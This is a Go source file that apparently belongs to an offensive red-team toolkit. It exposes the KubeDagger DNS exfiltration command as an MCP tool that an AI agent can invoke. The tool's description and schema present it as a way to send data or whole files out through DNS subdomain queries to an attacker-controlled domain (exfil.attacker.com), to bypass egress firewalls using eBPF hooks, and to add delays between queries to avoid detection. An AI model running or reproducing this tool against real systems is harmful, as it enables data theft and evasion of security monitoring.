package kubedagger

import (
	"context"
	"encoding/json"
	"fmt"
	"strings"

	"github.com/yasindce1998/redhands/pkg/executor"
	"github.com/yasindce1998/redhands/pkg/mcp"
)

type DNSExfilInput struct {
	Domain    string `json:"domain"`
	Data      string `json:"data,omitempty"`
	Source    string `json:"source,omitempty"`
	Encoding  string `json:"encoding,omitempty"`
	ChunkSize int    `json:"chunk_size,omitempty"`
	Delay     int    `json:"delay,omitempty"`
}

type DNSExfilTool struct {
	exec executor.Executor
}

func NewDNSExfil(exec executor.Executor) *DNSExfilTool {
	return &DNSExfilTool{exec: exec}
}

func (t *DNSExfilTool) Name() string { return "kubedagger_dns_exfil" }

func (t *DNSExfilTool) Description() string {
	return "Exfiltrate data via DNS queries by encoding payloads in subdomain labels. Bypasses egress firewalls that block direct connections but allow DNS resolution. Uses eBPF to hook DNS resolution and inject encoded data."
}

func (t *DNSExfilTool) InputSchema() json.RawMessage {
	return json.RawMessage(`{
		"type": "object",
		"properties": {
			"domain": {
				"type": "string",
				"description": "Attacker-controlled domain for DNS exfiltration (e.g., 'exfil.attacker.com')"
			},
			"data": {
				"type": "string",
				"description": "Data to exfiltrate (or use source for file path)"
			},
			"source": {
				"type": "string",
				"description": "Source file path to exfiltrate"
			},
			"encoding": {
				"type": "string",
				"enum": ["base32", "base64", "hex"],
				"description": "Encoding for DNS labels (default: base32)"
			},
			"chunk_size": {
				"type": "integer",
				"description": "Bytes per DNS query (max 63 per label)"
			},
			"delay": {
				"type": "integer",
				"description": "Delay in milliseconds between queries to avoid detection"
			}
		},
		"required": ["domain"]
	}`)
}

func (t *DNSExfilTool) Execute(ctx context.Context, params json.RawMessage) (*mcp.ToolResult, error) {
	var input DNSExfilInput
	if err := json.Unmarshal(params, &input); err != nil {
		return errorResult("invalid input: " + err.Error()), nil
	}

	if err := validateSafeString(input.Domain, "domain"); err != nil {
		return errorResult(err.Error()), nil
	}
	if err := validateSafeString(input.Data, "data"); err != nil {
		return errorResult(err.Error()), nil
	}
	if err := validateSafeString(input.Source, "source"); err != nil {
		return errorResult(err.Error()), nil
	}

	args := []string{"dns-exfil", "--domain", input.Domain}
	if input.Data != "" {
		args = append(args, "--data", input.Data)
	}
	if input.Source != "" {
		args = append(args, "--source", input.Source)
	}
	if input.Encoding != "" {
		args = append(args, "--encoding", input.Encoding)
	}
	if input.ChunkSize > 0 {
		args = append(args, "--chunk-size", fmt.Sprintf("%d", input.ChunkSize))
	}
	if input.Delay > 0 {
		args = append(args, "--delay", fmt.Sprintf("%d", input.Delay))
	}

	result, err := t.exec.Run(ctx, "kubedagger-client", args...)
	if err != nil {
		stderr := ""
		if result != nil {
			stderr = string(result.Stderr)
		}
		return errorResult(fmt.Sprintf("kubedagger dns-exfil failed: %s\n%s", err.Error(), stderr)), nil
	}

	output := strings.TrimSpace(string(result.Stdout))
	var sb strings.Builder
	fmt.Fprintf(&sb, "## KubeDagger DNS Exfiltration: %s\n\n", input.Domain)
	if output == "" {
		sb.WriteString("Exfiltration complete.\n")
	} else {
		sb.WriteString("```\n")
		sb.WriteString(output)
		sb.WriteString("\n```\n")
	}

	return &mcp.ToolResult{
		Content: []mcp.ContentBlock{{Type: "text", Text: sb.String()}},
	}, nil
}
